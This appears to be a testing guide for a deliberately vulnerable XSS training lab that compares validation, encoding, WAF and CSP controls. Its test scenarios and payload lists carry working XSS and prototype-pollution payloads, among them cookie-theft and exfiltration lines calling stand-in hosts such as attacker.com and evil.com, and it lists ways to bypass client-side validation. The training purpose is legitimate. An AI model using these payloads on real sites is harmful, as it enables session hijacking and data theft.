# Testing Guide

## Fixed Issues

### 1. ✅ Client-Side Validation Now Works Properly
- **Real-time validation**: Shows error message as you type `<` or `>` characters
- **Easy to bypass**: Can still be bypassed by disabling JavaScript or intercepting the request
- **Test it**: 
  1. Enable "Client-Side Validation" checkbox
  2. Try typing `<script>` in the input field
  3. You'll see validation error immediately when you type `<`
  4. Form submission will be blocked with an alert

### 2. ✅ Virtual DOM Section Removed
- Removed `/virtual-dom` endpoint
- Removed `public/virtual-dom.html` file
- Updated homepage to show only 4 exploit types
- Updated README documentation

### 3. ✅ DOM-Based XSS Now Executes Properly
- Changed behavior: Now reloads page when you click "Update Hash & Display"
- Payload in hash fragment is processed on page load
- Scripts will execute if no protections are enabled

## Quick Test Scenarios

### Test 1: Client-Side Validation (All Pages)
```
1. Go to /reflected
2. Enable "Client-Side Validation"
3. Type: <img src=x>
4. Expected: 
   - Input field and fieldset turn red with shake animation
   - Error message appears in DOM: "⚠️ Client-Side Validation: Input contains dangerous characters (< or >)"
   - Form submission is blocked
   - Error styling disappears after 3 seconds
5. Clear the dangerous characters: Error disappears immediately
6. Bypass: Disable validation checkbox or use browser tools to submit directly
```

### Test 2: Reflected XSS
```
No Controls:
URL: /reflected?input=<img src=x onerror=alert('XSS')>
Expected: Alert fires

With Output Encoding:
URL: /reflected?input=<img src=x onerror=alert('XSS')>&encoding=true
Expected: HTML is escaped and displayed as text
```

### Test 3: Stored XSS
```
No Controls:
1. Post comment: <svg/onload=alert('Stored')>
2. Expected: Alert fires immediately and on every page load

With Server Validation:
1. Enable "Server-Side Validation"
2. Post comment: <svg/onload=alert('Stored')>
3. Expected: Server rejects with error page
```

### Test 4: DOM-Based XSS
```
No Controls:
1. Go to /dom-based
2. Enter: <img src=x onerror=alert('DOM-XSS')>
3. Click "Update Hash & Display"
4. Expected: Page reloads and alert fires

With Output Encoding:
1. Enable "Output Encoding"
2. Enter: <img src=x onerror=alert('DOM-XSS')>
3. Click "Update Hash & Display"
4. Expected: HTML displayed as text, no execution
```

### Test 5: Prototype Pollution
```
No Controls:
1. Go to /prototype-pollution
2. Enter: __proto__[innerHTML]=<img src=x onerror=alert('PP')>
3. Click "Parse Hash & Apply"
4. Click "Test Pollution"
5. Expected: Alert fires from polluted property

With Input Validation:
1. Enable "Validate Dangerous Keys"
2. Enter: __proto__[innerHTML]=<img src=x onerror=alert('PP')>
3. Click "Parse Hash & Apply"
4. Expected: Blocked with warning
```

### Test 6: WAF Protection
```
1. Go to /reflected?waf=true&input=<script>alert('XSS')</script>
2. Expected: Blocked by WAF with 403 error page
3. Try different payloads to see what gets blocked
```

### Test 7: CSP Script Execution Controls
```
1. Go to /reflected?csp=strict&input=<script>alert('XSS')</script>
2. Expected: Script blocked, check browser console for CSP violation
3. Try with csp=unsafe-inline to allow inline scripts
```

### Test 8: CSP Post-Exploitation Prevention
```
Test Block Data Exfiltration:
1. Go to /reflected?csp=block-exfiltration&input=<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
2. Expected: Script executes (alert shows) but fetch is blocked by connect-src 'none'
3. Check browser console: "Refused to connect to 'https://attacker.com' because it violates the following Content Security Policy directive: 'connect-src 'none''"

Test Allow Self-Origin Only:
1. Go to /reflected?csp=allow-self-only&input=<script>fetch('https://evil.com?data=stolen')</script>
2. Expected: Fetch to external domain blocked, but fetch to same origin works
3. Try: <script>fetch('/reflected?test=1')</script> - This should work

Test Block All Requests:
1. Go to /reflected?csp=block-requests&input=<script>new Image().src='https://attacker.com?cookie='+document.cookie</script>
2. Expected: Image request blocked by connect-src 'none'
3. Console shows CSP violation

Test Block Form Submissions:
1. Go to /reflected?csp=block-forms&input=<form action="https://attacker.com"><input name="data" value="stolen"></form><script>document.forms[0].submit()</script>
2. Expected: Form submission to external domain blocked by form-action 'none'
3. Console shows CSP violation
```

## Client-Side Validation Details

### Visual Feedback
When client-side validation detects dangerous characters:
1. **Shake Animation**: Input field shakes left-right for 0.5 seconds
2. **Red Styling**: Input and fieldset backgrounds turn red (#ffebee)
3. **Red Border**: 2px solid red border (#f44336)
4. **DOM Error Message**: Red box with warning icon appears below input
5. **Auto-Clear**: Error styling fades after 3 seconds (message persists until input is corrected)

### Error Message Format
```
⚠️ Client-Side Validation: Input contains dangerous characters (< or >)
```

### Bypass Methods

1. **Disable JavaScript**: Turn off JS in browser settings
2. **Disable the Checkbox**: Uncheck "Client-Side Validation" before submitting
3. **Intercept Request**: Use browser DevTools to modify request
4. **Direct URL**: Navigate directly to URL with payload
5. **Browser Console**: Call form.submit() or modify validation functions
6. **Curl/Postman**: Send request without browser

Example:
```bash
curl "http://localhost:3000/reflected?clientValidation=true&input=<script>alert('bypassed')</script>"
```

### Key Training Point
The DOM-based error feedback demonstrates that client-side validation is purely for UX. The shake animation and red styling make it clear something is blocked, but attackers can easily bypass it. This is NOT a security control.

## Common Payloads to Try

### Basic XSS Payloads
- `<script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `<svg/onload=alert('XSS')>`
- `<iframe src="javascript:alert('XSS')">`
- `<body onload=alert('XSS')>`

### Post-Exploitation Payloads (Test with CSP)

#### Cookie Theft / Session Hijacking
- `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`
- `<script>new Image().src='https://evil.com?session='+document.cookie</script>`
- `<img src=x onerror="navigator.sendBeacon('https://attacker.com',document.cookie)">`

#### Data Exfiltration
- `<script>fetch('https://evil.com?data='+btoa(document.body.innerHTML))</script>`
- `<img src=x onerror=fetch('https://attacker.com?html='+encodeURIComponent(document.documentElement.outerHTML))>`

#### Session Riding (CSRF-like)
- `<script>fetch('/admin/delete',{method:'POST'})</script>`
- `<form action="https://attacker.com" method="POST"><input name="data" value="stolen"></form><script>document.forms[0].submit()</script>`

#### Redirect with Data
- `<script>document.location='https://attacker.com?cookie='+document.cookie</script>`

### Prototype Pollution Payloads
- `__proto__[innerHTML]=<img src=x onerror=alert('PP')>`
- `constructor[prototype][xss]=<svg/onload=alert('PP')>`
- `__proto__[src]=javascript:alert('XSS')`

## Expected Behavior Summary

| Control | Reflected | Stored | DOM-Based | Prototype |
|---------|-----------|--------|-----------|-----------|
| None | ❌ Vulnerable | ❌ Vulnerable | ❌ Vulnerable | ❌ Vulnerable |
| Client Val | ⚠️ Bypassed | ⚠️ Bypassed | ⚠️ Bypassed | ⚠️ Bypassed |
| Server Val | ✅ Protected | ✅ Protected | ❌ No Effect | ❌ No Effect |
| Encoding | ✅ Protected | ✅ Protected | ✅ Protected | ✅ Protected |
| WAF | ✅ Protected | ✅ Protected | ❌ No Effect | ❌ No Effect |
| CSP (script-src) | ✅ Blocks Execution | ✅ Blocks Execution | ✅ Blocks Execution | ✅ Blocks Execution |
| CSP (connect-src) | ⚠️ Allows XSS but blocks fetch | ⚠️ Allows XSS but blocks fetch | ⚠️ Allows XSS but blocks fetch | ⚠️ Allows XSS but blocks fetch |
| CSP (form-action) | ⚠️ Allows XSS but blocks forms | ⚠️ Allows XSS but blocks forms | ⚠️ Allows XSS but blocks forms | ⚠️ Allows XSS but blocks forms |
| Cookie Flags | ⚠️ Partial | ⚠️ Partial | ⚠️ Partial | ⚠️ Partial |

Legend:
- ✅ Protected: Prevents the attack
- ❌ Vulnerable: Attack succeeds
- ⚠️ Bypassed: Can be easily bypassed
- ❌ No Effect: Control doesn't apply to this attack type
- ⚠️ Partial: Only protects cookies, doesn't stop XSS

